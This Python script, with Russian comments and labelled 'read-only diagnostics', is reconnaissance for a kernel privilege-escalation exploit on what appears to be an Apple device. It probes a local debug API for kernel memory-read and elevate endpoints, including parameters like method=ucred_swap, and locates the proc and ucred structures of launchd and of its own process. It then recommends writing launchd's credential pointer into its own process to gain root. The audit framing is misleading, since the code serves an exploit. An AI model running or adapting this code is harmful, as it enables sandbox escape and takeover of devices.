#!/usr/bin/env python3
"""
advanced_audit.py

Диагностический скрипт (read-only) для продвинутого аудита возможных векторов эскалации,
включая попытки обнаружения 'ucred swap' в нашем процессе.

Работает только в режиме диагностики и чтения. Ни одна операция записи не выполняется.

Пример ожиданий: скрипт выведет launchd_proc, launchd_ucred, our_proc, our_ucred
и предложит потенциальный вектор в виде пары адресов (куда можно попробовать записать).
"""
from __future__ import annotations

import argparse
import sys
import logging
from typing import Optional, Tuple, Dict, Any, List

import requests

logging.basicConfig(level=logging.INFO, format="%(message)s")
logger = logging.getLogger("advanced_audit")

DEFAULT_HOST = "http://192.168.1.5:8686"
DEFAULT_TIMEOUT = 5.0
PTR_SIZE = 8  # assume 64-bit kernel pointers


def safe_get(base: str, path: str, params: dict = None, timeout: float = DEFAULT_TIMEOUT) -> Optional[dict]:
    url = base.rstrip("/") + path
    try:
        r = requests.get(url, params=params, timeout=timeout)
        r.raise_for_status()
        try:
            return r.json()
        except ValueError:
            return {"raw": r.text}
    except requests.exceptions.RequestException as e:
        logger.debug("GET %s failed: %s", url, e)
        return None


def probe_endpoints(base: str, timeout: float) -> Dict[str, Any]:
    """Пытаем ряд известных и undocumented эндпоинтов с разными параметрами."""
    endpoints = [
        "/api/v1/sbx",
        "/api/v1/elevate",
        "/api/v1/ds",
        "/api/v1/ids",
        "/api/v1/proc_for_pid",
        "/api/v1/find_proc",
        "/api/v1/proc",
        "/api/v1/process",
        "/api/v1/mem",
        "/api/v1/read",
        "/api/v1/peek",
        "/api/v1/task_for_pid",
        "/api/v1/task",
        "/api/v1/port_for_pid",
        "/api/v1/undocumented",  # try a likely undocumented path
    ]

    param_variants = [
        None,
        {"force": "1"},
        {"method": "ucred_swap"},
        {"target": "launchd"},
        {"force": "1", "method": "ucred_swap"},
    ]

    results: Dict[str, Any] = {}
    for ep in endpoints:
        results[ep] = {}
        for params in param_variants:
            resp = safe_get(base, ep, params=params, timeout=timeout)
            key = "default" if not params else "&".join(f"{k}={v}" for k, v in params.items())
            results[ep][key] = resp
    return results


def parse_ds_for_proc(ds: dict, key_names: List[str]) -> Optional[int]:
    for k in key_names:
        if k in ds:
            try:
                v = ds[k]
                if isinstance(v, str):
                    return int(v, 0)
                return int(v)
            except Exception:
                continue
    return None


def discover_proc_for_pid(base: str, pid: int, timeout: float, ds: Optional[dict]) -> Optional[int]:
    """Пробуем обнаружить адрес `proc` для заданного PID через различные эндпоинты и данные ds."""
    # 1) Try dedicated endpoints
    candidates = [
        ("/api/v1/proc_for_pid", {"pid": str(pid)}),
        ("/api/v1/find_proc", {"pid": str(pid)}),
        ("/api/v1/process", {"pid": str(pid)}),
        ("/api/v1/proc", {"pid": str(pid)}),
        ("/api/v1/proc", None),
    ]
    for ep, params in candidates:
        resp = safe_get(base, ep, params=params, timeout=timeout)
        if not resp:
            continue
        # common patterns
        for k in ("proc", "proc_addr", "addr", "proc_address", "ourproc", "our_proc"):
            if k in resp:
                try:
                    v = resp[k]
                    return int(v, 0) if isinstance(v, str) else int(v)
                except Exception:
                    pass
        # if the response contains pid->addr mapping
        if isinstance(resp, dict) and str(pid) in resp:
            try:
                return int(resp[str(pid)], 0)
            except Exception:
                pass

    # 2) Try ds payload if present (server often reports ourproc and kernel symbols)
    if ds and isinstance(ds, dict):
        # keys to try
        for key in ("proc_for_pid_1", "launchd_proc", "pid1_proc", "proc_1", "ourproc"):
            if key in ds:
                try:
                    return int(ds[key], 0) if isinstance(ds[key], str) else int(ds[key])
                except Exception:
                    pass
        # sometimes ds includes a list of processes
        for key in ("processes", "procs"):
            if key in ds and isinstance(ds[key], dict):
                for name, info in ds[key].items():
                    if name.lower().startswith("launchd") or name == "1":
                        try:
                            if isinstance(info, dict) and "addr" in info:
                                return int(info["addr"], 0)
                        except Exception:
                            pass

    return None


def try_memory_read(base: str, address: int, size: int = PTR_SIZE, timeout: float = DEFAULT_TIMEOUT) -> Optional[int]:
    """Попытка прочитать память через известные эндпоинты; возвращает целое или None."""
    endpoints = [
        ("/api/v1/mem", ("addr", "size")),
        ("/api/v1/read", ("addr", "size")),
        ("/api/v1/peek", ("addr", "size")),
        ("/api/v1/memory/read", ("address", "length")),
        ("/api/v1/kread", ("addr", "size")),
    ]
    for ep, (addr_name, size_name) in endpoints:
        params = {addr_name: hex(address), size_name: str(size)}
        resp = safe_get(base, ep, params=params, timeout=timeout)
        if not resp:
            continue
        # parse common formats
        if isinstance(resp, dict):
            if "value" in resp:
                try:
                    return int(resp["value"])
                except Exception:
                    pass
            if "data" in resp and isinstance(resp["data"], str):
                s = resp["data"].strip()
                try:
                    return int(s, 16)
                except Exception:
                    pass
            if "bytes" in resp and isinstance(resp["bytes"], str):
                try:
                    raw = bytes.fromhex(resp["bytes"].strip())
                    return int.from_bytes(raw, "little")
                except Exception:
                    pass
            if "raw" in resp and isinstance(resp["raw"], str):
                s = resp["raw"].strip()
                if s.startswith("0x"):
                    try:
                        return int(s, 16)
                    except Exception:
                        pass
        # if response is a plain hex string
        if isinstance(resp, str):
            s = resp.strip()
            if s.startswith("0x"):
                try:
                    return int(s, 16)
                except Exception:
                    pass
    return None


def scan_ourproc_for_candidates(base: str, ourproc: int, launchd_ucred: Optional[int], timeout: float) -> List[Tuple[int, int]]:
    """Сканируем область структуры ourproc в поисках потенциальных полей (ptr-sized), которые можно было бы заменить.
    Возвращаем список кандидатов в виде (offset, current_value).
    Критерий отбора (heuristic): поле имеет нулевое значение или маленькое число (<0x1000) или похоже на пользовательский адрес.
    """
    candidates: List[Tuple[int, int]] = []
    if ourproc is None:
        return candidates
    # scan first 0x200 bytes (adjustable)
    scan_range = 0x200
    for off in range(0, scan_range, PTR_SIZE):
        addr = ourproc + off
        val = try_memory_read(base, addr, size=PTR_SIZE, timeout=timeout)
        if val is None:
            continue
        # heuristics for 'safe' candidate
        if val == 0 or val < 0x1000:
            candidates.append((off, val))
        # also consider if value equals our_ucred (no-change) or not; include if different
        if launchd_ucred and val != launchd_ucred and (val & (~0xfff)) != 0:
            # if it's a pointer-like value but not kernel pointer (loosely)
            pass
    return candidates


def format_hex(v: Optional[int]) -> str:
    return hex(v) if v is not None else "Unknown"


def generate_report(base: str, timeout: float):
    # 1) probe endpoints
    probes = probe_endpoints(base, timeout)

    # 2) collect ds and ids
    ds = safe_get(base, "/api/v1/ds", timeout=timeout)
    ids = safe_get(base, "/api/v1/ids", timeout=timeout)

    # 3) discover ourproc
    ourproc = None
    if ds and isinstance(ds, dict):
        ourproc = parse_ds_for_proc(ds, ["ourproc", "our_proc", "our_proc_addr", "our_proc_address"]) or parse_ds_for_proc(ds, ["our_proc"])
    # if not found, try special endpoint without pid
    if ourproc is None:
        ourproc = discover_proc_for_pid(base, pid=0, timeout=timeout, ds=ds)

    # 4) discover launchd proc (PID 1)
    launchd_proc = discover_proc_for_pid(base, pid=1, timeout=timeout, ds=ds)

    # 5) read ucred pointers: proc + 0x20 (as requested)
    launchd_ucred = None
    our_ucred = None
    if launchd_proc:
        launchd_ucred = try_memory_read(base, launchd_proc + 0x20, size=PTR_SIZE, timeout=timeout)
    if ourproc:
        our_ucred = try_memory_read(base, ourproc + 0x20, size=PTR_SIZE, timeout=timeout)

    # 6) scan ourproc for candidate offsets
    candidates = scan_ourproc_for_candidates(base, ourproc, launchd_ucred, timeout)

    # 7) assemble recommendation
    recommended = "No clear candidate found"
    if candidates and launchd_ucred:
        off, cur = candidates[0]
        recommended = f"Попытаться записать launchd_ucred ({format_hex(launchd_ucred)}) в our_proc + {hex(off)} ({format_hex(ourproc + off)})"

    # 8) Print report
    print()
    print("Advanced Audit Report (read-only diagnostics)")
    print("-- Endpoints probe summary --")
    # compact summary: show for main endpoints whether they responded
    for ep in ("/api/v1/sbx", "/api/v1/elevate", "/api/v1/mem", "/api/v1/read"):
        resp = probes.get(ep, {})
        ok = any(v is not None for v in resp.values())
        print(f"{ep}: {'Responded' if ok else 'No response'}")

    print()
    print("-- Key Addresses --")
    print(f"launchd_proc: {format_hex(launchd_proc)}")
    print(f"launchd_ucred: {format_hex(launchd_ucred)}")
    print(f"our_proc: {format_hex(ourproc)}")
    print(f"our_ucred: {format_hex(our_ucred)}")

    print()
    print("-- Candidates in our_proc (offset, current_value) --")
    if candidates:
        for off, cur in candidates:
            print(f"{hex(off)} -> {format_hex(cur)}")
    else:
        print("None found (read-only scan)")

    print()
    print("-- Raw probe details (truncated) --")
    # show a trimmed set for brevity
    for k, v in list(probes.items())[:8]:
        print(f"{k}: keys={list(v.keys())}")

    print()
    print(f"Рекомендуемый вектор: {recommended}")
    print()


def main(argv: Optional[List[str]] = None):
    p = argparse.ArgumentParser(description="Advanced read-only audit for potential ucred-swap vectors")
    p.add_argument("--host", default=DEFAULT_HOST, help="Base URL of the debug API (default: %(default)s)")
    p.add_argument("--timeout", type=float, default=DEFAULT_TIMEOUT, help="HTTP timeout seconds")
    args = p.parse_args(argv)

    try:
        generate_report(args.host, args.timeout)
    except KeyboardInterrupt:
        logger.info("Cancelled by user")
        sys.exit(1)


if __name__ == "__main__":
    main()
